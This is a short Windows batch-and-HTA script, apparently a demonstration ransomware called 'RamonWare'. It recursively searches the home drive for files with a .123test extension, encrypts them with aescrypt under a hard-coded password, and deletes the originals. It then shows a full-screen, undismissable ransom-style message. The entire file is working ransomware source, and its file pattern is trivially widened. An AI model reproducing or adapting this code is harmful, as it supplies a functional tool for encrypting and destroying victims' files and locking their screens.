<!-- :: Batch Section
@Echo OFF
mode con:cols=50 lines=2
set pass=SegoCode

Title Ramon Ware

echo Scanning. . . .

REM Set the root path for the operation
set ROOT_PATH=%homedrive%\

REM Start the loop searching for files with the .123test extension in all folders and subfolders on the drive
FOR /R "%ROOT_PATH%" %%X in (*.123test) DO (
    REM Safe Mode: Uncomment the following lines to activate safe mode. Safe mode is intended for use during development or in a test environment to prevent data loss.
    REM Save the original filename to a text file for future reference
    REM echo %%X >> %homedrive%\Original.txt

    REM Change the original file's extension to .bak to preserve it instead of deleting it
    REM ren "%%X" "%%~nX.bak"

    REM Normal Mode: Encrypt the file and then delete it
    REM Comment out the following two lines to deactivate normal mode and activate safe mode
    aescrypt -e -p %pass% "%%X"
    del "%%X"
)

REM Block Screen
cls
setlocal
for /F "delims=" %%a in ('mshta.exe "%~F0"') do set "HTA=%%a"

-->

<html>
    <head>
        <title>CryptMSG</title>
    <hta:application id="oBVC" 
                     applicationname="BSOD"  
                     version="1.0" 
                     maximizebutton="no" 
                     minimizebutton="no" 
                     sysmenu="no" 
                     Caption="no" 
                     windowstate="maximize"/> 
    <style>
        #texto2{
            padding-top: 19%;
            letter-spacing: 1px;
            text-align: center;
        }
    </style>
</head>
<body bgcolor="#8c1d1d" scroll="no">
    <font face="Lucida Console" size="4" color="white">
<center><p> - RamonWare Crypt - </p></center>
<div id="texto2">
    Oops, Your Files Have Been Encrypted!<br>
    <br><br>
    Now you need run RamonDecryptor, be careful next time<br>
    <br><br>
   Github.com/SegoCode<br>
    <br><br><br>
    <img id="imagen" alt="Candado" src="https://i.imgur.com/rytGPFG.png" height="130" width="100">
</div>
</body>
</html>
